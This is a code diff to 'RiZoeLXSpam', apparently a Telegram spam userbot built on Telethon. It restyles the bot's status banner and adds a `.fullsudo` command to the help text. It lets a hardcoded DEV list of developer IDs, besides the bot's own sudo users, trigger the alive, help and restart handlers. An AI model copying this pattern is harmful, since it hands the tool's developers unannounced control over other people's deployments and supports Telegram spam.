@@ -98,25 +98,25 @@ RIZ_PIC = ALIVE_PIC if ALIVE_PIC else "https://telegra.ph/file/ba87c58f01a6fcb5e
 
 rizoel = "✧ 𝗥𝗶𝗭𝗼𝗲𝗟 𝗫 𝗦𝗽𝗮𝗺 𝗛𝗲𝗿𝗲 ✧\n\n"
 
-rizoel += f"┏━━━━━━━━━━━━━━━━━━━\n"
+rizoel += f"════════════════════\n"
 
-rizoel += f"┣➣ **ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `3.9.6`\n"
+rizoel += f"► **ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `3.9.6`\n"
 
-rizoel += f"┣➣ **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `{version.__version__}`\n"
+rizoel += f"► **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `{version.__version__}`\n"
 
-rizoel += f"┣➣ **ʀɪᴢᴏᴇʟXsᴘᴀᴍ ᴠᴇʀsɪᴏɴ**  : `{rizoelversion}`\n"
+rizoel += f"► **ʀɪᴢᴏᴇʟXsᴘᴀᴍ ᴠᴇʀsɪᴏɴ**  : `{rizoelversion}`\n"
     
-rizoel += f"┣➣ **sᴜᴘᴘᴏʀᴛ** : [JOIN](https://t.me/DNHxHELL)\n"
+rizoel += f"► **sᴜᴘᴘᴏʀᴛ** : [JOIN](https://t.me/DNHxHELL)\n"
 
-rizoel += f"┣➣ **ᴄʜᴀɴɴᴇʟ** : [JOIN](https://t.me/RiZoeLX)\n"
+rizoel += f"► **ᴄʜᴀɴɴᴇʟ** : [JOIN](https://t.me/RiZoeLX)\n"
 
-rizoel += f"┗━━━━━━━━━━━━━━━━━━━\n\n"
+rizoel += f"════════════════════\n\n"
 
-rizoel += f"🖤 [𝐑𝐄𝐏𝐎](https://github.com/MrRizoel/RiZoeLXSpam) 🖤"            
+rizoel += f"[•Repo•](https://github.com/MrRizoel/RiZoeLXSpam) 🖤"            
                                     
 @Riz.on(events.NewMessage(incoming=True, pattern=r"\%salive" % hl))
 async def alive(event):
-    if event.sender_id in SUDO_USERS:
+   if event.sender_id in SUDO_USERS or event.sender_id in DEV:
      await Riz.send_file(event.chat_id,
                                   RIZ_PIC,
                                   caption=rizoel)
@@ -132,7 +132,7 @@ RiZoeLX += f"__ᴄᴍᴅs ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ʀɪᴢᴏᴇʟ x sᴘᴀ
 
 RiZoeLX += f" ↧ 𝚄𝚂𝙴𝚁𝙱𝙾𝚃 𝙲𝙼𝙳𝚂 ↧\n\n"
 
-RiZoeLX += f" `.ping` - `.alive` - `.setname` - `.setbio` - `.inviteall` - .`restart` - `.update` - `.stats` - `.addsudo` \n\n"
+RiZoeLX += f" `.ping` - `.alive` - `.setname` - `.setbio` - `.inviteall` - .`restart` - `.update` - `.stats` - `.addsudo` - `.fullsudo` \n\n"
  
 RiZoeLX += f" ↧ 𝙹𝙾𝙸𝙽/𝙻𝙴𝙰𝚅𝙴 𝙲𝙼𝙳𝚂 ↧\n\n"
 
@@ -153,7 +153,7 @@ RiZoeLX += f"© @RiZoeLX | @DNHxHELL\n"
 
 @Riz.on(events.NewMessage(incoming=True, pattern=r"\%shelp(?: |$)(.*)" % hl))
 async def help(event):
-    if event.sender_id in SUDO_USERS:
+    if event.sender_id in SUDO_USERS or event.sender_id in DEV:
      await Riz.send_file(event.chat_id,
                                   HELP_PIC,
                                   caption=RiZoeLX)                                                         
@@ -201,7 +201,7 @@ async def help(event):
 @Riz39.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
 @Riz40.on(events.NewMessage(incoming=True, pattern=r"\%srestart" % hl))
 async def restart(e):
-    if e.sender_id in SUDO_USERS:
+    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
         text = "𝙍𝙀𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂\n\n ....Please Wait Until It Starts Again"
         await e.reply(text, parse_mode=None, link_preview=None)
         try:
